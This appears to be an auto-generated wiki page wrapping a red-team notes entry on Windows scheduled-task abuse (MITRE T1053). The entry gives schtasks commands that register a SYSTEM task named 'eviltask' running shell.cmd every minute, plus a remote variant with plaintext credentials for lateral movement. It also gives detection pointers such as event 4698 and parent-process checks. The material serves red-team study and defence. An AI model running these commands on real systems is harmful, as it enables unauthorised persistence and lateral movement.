---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Schtask

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1053-schtask` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1053-schtask.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Schtask](../../topics/offensive-security/schtask.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-persistence-t1053-schtask |
| name | Schtask |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/persistence/t1053-schtask.md |

## Preserved Source Material

````yaml
_asset_filenames:
- schtask-ancestry.png
- schtask-connection.png
- schtasks-created-new-task.png
- schtasks-created.png
- schtasks-remote.png
_body: '---

  description: ''Code execution, privilege escalation, lateral movement and persitence.''

  ---


  # Schtask


  ## Execution


  Creating a new scheduled task that will launch shell.cmd every minute:


  {% code title="attacker@victim" %}

  ```bash

  schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"

  ```

  {% endcode %}


  ## Observations


  Note that processes spawned as scheduled tasks have `taskeng.exe` process as their parent:


  ![](../../.gitbook/assets/schtask-ancestry.png)


  Monitoring and inspecting commandline arguments and established network connections by processes can help uncover suspicious
  activity:


  ![](../../.gitbook/assets/schtasks-created.png)


  ![](../../.gitbook/assets/schtask-connection.png)


  Also, look for events 4698 indicating new scheduled task creation:


  ![](../../.gitbook/assets/schtasks-created-new-task.png)


  ### Lateral Movement


  Note that when using schtasks for lateral movement, the processes spawned do not have taskeng.exe as their parent, rather
  - svchost:


  {% code title="attacker@victim" %}

  ```bash

  schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password

  ```

  {% endcode %}


  ![](../../.gitbook/assets/schtasks-remote.png)


  ## References


  {% embed url="https://attack.mitre.org/wiki/Technique/T1053" %}


  {% embed url="https://docs.microsoft.com/en-us/windows/desktop/taskschd/schtasks" %}'
_relative_path: offensive-security/persistence/t1053-schtask.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1053-schtask.md
````
